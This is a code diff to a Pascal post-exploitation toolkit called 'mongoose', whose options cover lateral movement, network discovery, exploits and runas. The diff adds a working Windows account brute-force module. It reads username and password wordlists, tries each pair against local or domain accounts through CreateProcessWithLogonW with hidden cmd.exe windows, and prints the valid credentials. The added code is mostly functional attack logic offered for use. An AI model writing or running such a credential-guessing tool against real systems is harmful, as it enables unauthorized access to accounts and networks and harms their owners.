@@ -94,6 +94,7 @@ type
   Tmongoose = class(TCustomApplication)
   protected
     procedure DoRun; override;
+
   public
     constructor Create(TheOwner: TComponent); override;
     destructor Destroy; override;
@@ -115,7 +116,7 @@ type
     procedure Lateralmovement;virtual;
     procedure networkdiscovery;virtual;
     procedure http_cmdlet;virtual;
-
+    procedure Acc_BF;virtual;
 
   end;
 
@@ -131,12 +132,13 @@ function CreateProcessWithLogonW(lpUsername: PWideChar; lpDomain: PWideChar;
 
 
 
+
 procedure Tmongoose.DoRun;
 var
   ErrorMsg: String;
 begin
   // quick check parameters
-  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
+  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
   if ErrorMsg<>'' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -204,7 +206,7 @@ begin
     // terminate;
   end;
   if hasoption('bf') then begin
-  // windows account bruteforce Local or Domain user
+  Acc_BF;
   end;
   if hasoption('m','mongoose') then begin
      systeminfo;
@@ -535,7 +537,51 @@ begin
     result := sinsock;
 end;
 
+// Account BF module
 
+procedure accountvalidation(Ausername,Apassword,Adomain,AApplication:string);
+const
+  LOGON_WITH_PROFILE = $00000001;
+ var
+  si: TStartupInfo;
+  pi: TProcessInformation;
+  chain:boolean;
+  SA: TSecurityAttributes;
+   PipeInputWrite,PipeInputRead,PipeOutputRead,PipeOutputWrite:Thandle;
+
+ begin
+
+  //creating of pipes
+    CreatePipe(PipeInputRead, PipeInputWrite, @SA, 0);
+    CreatePipe(PipeOutputRead, PipeOutputWrite, @SA, 0);
+    ZeroMemory(@si, SizeOf(si));
+
+   SA.nLength := SizeOf(@SA);
+   SA.bInheritHandle := true;
+   SA.lpSecurityDescriptor := nil;
+
+    si.cb := SizeOf(si);
+    si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
+    si.wShowWindow := SW_hide;
+    si.hStdInput := PipeInputRead;
+    si.hStdOutput := PipeOutputWrite;
+    si.hStdError := PipeOutputWrite;
+   ZeroMemory(@pi, SizeOf(pi));
+
+    chain := CreateProcessWithLogonW(PWideChar(WideString(AUsername)),
+     PWideChar(WideString(ADomain)), PWideChar(WideString(APassword)),
+     LOGON_WITH_PROFILE, nil, PWideChar(WideString(AApplication)),
+     0, nil, nil, si, pi);
+
+ if (chain) then
+   try
+   writeln('[+]Username: '+ Ausername+' with password '+Apassword+' is valid');
+   except
+    on E: exception do
+    writeln(E.message);
+    end;
+
+    end;
 //spwan a process with specific user
  procedure RunAsAccount(AUsername, APassword, ADomain, AApplication: string);
  const
@@ -652,6 +698,55 @@ var
  GetWin32_ProcessInfo;
  end;
 
+
+procedure Tmongoose.Acc_BF;
+var
+ i,ui,pi:integer;
+ Ulist,Plist:Tstringlist;
+ username,password,domain,process,msg:string;
+ begin
+ msg := 'Local Account';
+ writeln(' ');
+ writeln('[->] Starting Brute Force Account Using CreateProcessWithLoginW API Technique');
+ for i := 0 to paramcount do begin
+  if (paramstr(i)= '-username') then begin
+   username := paramstr(i+1);
+   writeln('[+] imported User Table');
+  end;
+  if (paramstr(i) ='-password') then begin
+   password := paramstr(i+1);
+   writeln('[+] imported Password Table');
+  end;
+  if (paramstr(i) = '-domain') then begin
+   domain := paramstr(i+1);
+   msg := 'Domain Account';
+  end;
+  end;
+ writeln('[+] Attack mode: '+msg);
+
+ Ulist := Tstringlist.Create;
+ Plist := Tstringlist.Create;
+ try
+ try
+ Ulist.LoadFromFile(username);
+ Plist.LoadFromFile(password);
+
+for ui := 0 to Ulist.Count -1 do
+for pi := 0 to Plist.count -1 do  begin
+accountvalidation(ulist[ui],plist[pi],domain,'cmd.exe');
+
+ end;
+
+ finally
+ ulist.Free;
+plist.Free;
+ end;
+  except
+   on E: exception do
+ writeln(E.Message);
+
+ end;
+ end;
 procedure Tmongoose.runas;
 var
  i:integer;
